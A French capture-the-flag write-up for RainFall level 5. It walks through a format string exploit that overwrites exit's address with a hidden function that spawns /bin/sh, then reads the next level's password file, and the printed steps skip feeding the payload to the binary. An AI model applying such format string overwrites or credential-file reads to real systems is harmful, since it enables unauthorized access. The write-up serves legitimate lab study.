# Level 5

On vas encore une fois utiliser une format string attaque.
cette fois nous avons une fonction `n` appeler dans le main qui va appeler comme les fois precedante printf avec le retour de l'entrer standard lue avec `fget`. Mais cette foi pas de condition qui donne les droit, elle exit apres le printf, par contre nous avons une fonction `o` a l'adresse `0x080484a4` non-appeler qui execute un `"/bin/sh"` donc il faut donc appeler la fonction `o` a la place de `exite` a l'adresse `0x8049838`.

En utilisant la meme logique que les levels precedents on cherche la position dans la stack ici on voit que l'adresse est en 4 position.
```
level5@RainFall:~$ python -c "print 'aaaa' + ' %x' * 4" | ./level5 
aaaa 200 b7fd1ac0 b7ff37d0 61616161
level5@RainFall:~$ 
```
On injecte donc l'adresse de la fonction o a la place de l'exit initialement appeler. Il nous faut donc l'adresse de o en decimal - 4 octets `0x080484a4` = `134513828` 134513828 - 4 = 134513824

 - `0x080484a4` = 134513828
 - 134513828 - 4 = 134513824
```
level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%134513824d%4\$n'" > /tmp/payload
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```